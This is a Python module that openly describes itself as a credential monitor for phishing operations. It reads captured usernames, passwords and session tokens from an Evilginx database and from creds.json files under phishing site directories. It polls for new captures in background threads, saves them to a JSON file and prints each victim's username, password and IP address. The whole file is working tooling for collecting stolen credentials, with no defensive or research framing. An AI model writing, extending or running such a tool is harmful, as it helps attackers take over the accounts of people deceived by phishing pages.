"""
Credential Monitoring Module
Watches and extracts credentials from Evilginx and phishing sites
"""

import os
import time
import json
import re
import uuid
import threading
from datetime import datetime

# Paths for credential sources
DB_PATH = "/root/.evilginx/data.db"
CREDS_DIR = "/var/www/html"
JSON_OUTPUT = "sessions.json"


# Store session data by ID
session_state = {}
credentials_by_monitor = {}
active_monitors = {}

def extract_evilginx_sessions():
    """Extract sessions from Evilginx database"""
    if not os.path.exists(DB_PATH):
        return []
    
    all_sessions = []
    
    try:
        with open(DB_PATH, "r", encoding="utf-8", errors="ignore") as file:
            for line in file:
                if '"phishlet"' in line:
                    try:
                        json_part = re.search(r'\{.*\}', line).group(0)
                        session = json.loads(json_part)
                        
                        session["session_status"] = "extracted"
                        session["credentials_extracted"] = bool(session.get("username") or session.get("password"))
                        session["session_captured"] = bool(session.get("tokens"))
                        session["source"] = "evilginx"
                        session["timestamp"] = datetime.now().isoformat()
                        
                        all_sessions.append(session)
                    except Exception as e:
                        print(f"Error parsing Evilginx session: {e}")
                        continue
    except Exception as e:
        print(f"Error reading Evilginx database: {e}")
    
    return all_sessions

def extract_site_credentials():
    """Extract credentials from phishing sites"""
    all_creds = []
    
    # Iterate through all potential phishing site directories
    try:
        if not os.path.exists(CREDS_DIR):
            return all_creds
        
        for domain_dir in os.listdir(CREDS_DIR):
            domain_path = os.path.join(CREDS_DIR, domain_dir)
            
            if not os.path.isdir(domain_path):
                continue
            
            creds_file = os.path.join(domain_path, "creds.json")
            
            if not os.path.exists(creds_file):
                continue
            
            try:
                with open(creds_file, "r", encoding="utf-8") as f:
                    creds = json.load(f)
                    
                    for item in creds:
                        item["source"] = "phishing_site"
                        item["domain"] = domain_dir
                        all_creds.append(item)
            except Exception as e:
                print(f"Error reading credentials from {creds_file}: {e}")
                continue
    except Exception as e:
        print(f"Error scanning for credentials: {e}")
    
    return all_creds

def background_watcher(monitor_id):
    """Background process to watch for credentials"""
    print(f"[*] Starting background watcher for monitor {monitor_id}")
    # Initialize state for this monitor
    credentials_by_monitor[monitor_id] = []
    last_evilginx_mtime = 0
    site_creds_last_seen = {}
    
    while monitor_id in active_monitors and active_monitors[monitor_id]:
        try:
            new_creds = []
            
            # Check Evilginx data
            if os.path.exists(DB_PATH):
                evilginx_mtime = os.path.getmtime(DB_PATH)
                if evilginx_mtime != last_evilginx_mtime:
                    last_evilginx_mtime = evilginx_mtime
                    evilginx_sessions = extract_evilginx_sessions()
                    
                    # Add new sessions that have credentials
                    for session in evilginx_sessions:
                        if (session.get("username") or session.get("password")) and \
                        session.get("id") not in [c.get("id") for c in credentials_by_monitor[monitor_id]]:
                            new_creds.append(session)
            
            # Check phishing site credentials
            site_creds = extract_site_credentials()
            
            # Add new site credentials
            for cred in site_creds:
                cred_id = cred.get("id")
                if cred_id and cred_id not in site_creds_last_seen:
                    site_creds_last_seen[cred_id] = True
                    new_creds.append(cred)
            
            # Add new credentials to the monitor's collection
            if new_creds:
                print(f"[+] Found {len(new_creds)} new credentials for monitor {monitor_id}")
                credentials_by_monitor[monitor_id].extend(new_creds)
                
                # Save to disk
                save_credentials_to_file()
            
            # Sleep before checking again
            time.sleep(5)
        except Exception as e:
            # Log error but continue monitoring
            print(f"[!] Error in monitor {monitor_id}: {str(e)}")
            time.sleep(5)

def save_credentials_to_file():
    """Save all credentials to a JSON file for persistence"""
    try:
        all_creds = []
        for monitor_creds in credentials_by_monitor.values():
            all_creds.extend(monitor_creds)
        
        with open(JSON_OUTPUT, "w", encoding="utf-8") as f:
            json.dump(all_creds, f, indent=4)
    except Exception as e:
        print(f"[!] Error saving credentials to file: {str(e)}")

def load_credentials_from_file():
    """Load credentials from JSON file"""
    try:
        if os.path.exists(JSON_OUTPUT):
            with open(JSON_OUTPUT, "r", encoding="utf-8") as f:
                all_creds = json.load(f)
            
            # Create a default monitor ID if none exists
            default_monitor_id = "default"
            if default_monitor_id not in credentials_by_monitor:
                credentials_by_monitor[default_monitor_id] = []
                active_monitors[default_monitor_id] = True
            
            # Add loaded credentials to default monitor
            credentials_by_monitor[default_monitor_id].extend(all_creds)
            
            print(f"[+] Loaded {len(all_creds)} credentials from file")
            return True
    except Exception as e:
        print(f"[!] Error loading credentials from file: {str(e)}")
    
    return False

def start_monitoring():
    """Start a new monitoring thread"""
    monitor_id = str(uuid.uuid4())
    active_monitors[monitor_id] = True
    
    # Start background thread
    thread = threading.Thread(target=background_watcher, args=(monitor_id,))
    thread.daemon = True
    thread.start()
    
    print(f"[+] Started monitoring with ID: {monitor_id}")
    return monitor_id

def stop_monitoring(monitor_id):
    """Stop a monitoring thread"""
    if monitor_id in active_monitors:
        active_monitors[monitor_id] = False
        print(f"[-] Stopped monitoring for {monitor_id}")
        return {"status": "success", "message": f"Monitoring stopped for {monitor_id}"}
    else:
        return {"status": "error", "message": "Monitor ID not found"}

def get_credentials(monitor_id=None):
    """Get credentials collected by a specific monitor or all monitors"""
    if monitor_id:
        if monitor_id in credentials_by_monitor:
            return credentials_by_monitor[monitor_id]
        else:
            return []
    else:
        # Combine all credentials from all monitors
        all_creds = []
        for monitor_creds in credentials_by_monitor.values():
            all_creds.extend(monitor_creds)
        return all_creds

# Initialize on module load
# Load any saved credentials
load_credentials_from_file()

# For backwards compatibility
def watch_file():
    """Original CLI function for watching credential files"""
    monitor_id = start_monitoring()
    
    print(f"[*] Started monitoring with ID: {monitor_id}")
    print("[*] Press Ctrl+C to stop")
    
    try:
        while True:
            creds = get_credentials(monitor_id)
            if creds:
                print(f"[*] Credentials captured: {len(creds)}")
                for cred in creds:
                    print(f"[+] Source: {cred.get('source', 'unknown')}")
                    print(f"    Username: {cred.get('username', '')}")
                    print(f"    Password: {cred.get('password', '')}")
                    print(f"    Username: {cred.get('username', '')}")
                    print(f"    Password: {cred.get('password', '')}")
                    print(f"    IP: {cred.get('ip', '')}")
                    print(f"    Timestamp: {cred.get('timestamp', '')}")
                    print("-" * 40)
            time.sleep(5)
    except KeyboardInterrupt:
        stop_monitoring(monitor_id)
        print("\n[!] Stopped watching.")

if __name__ == "__main__":
    watch_file()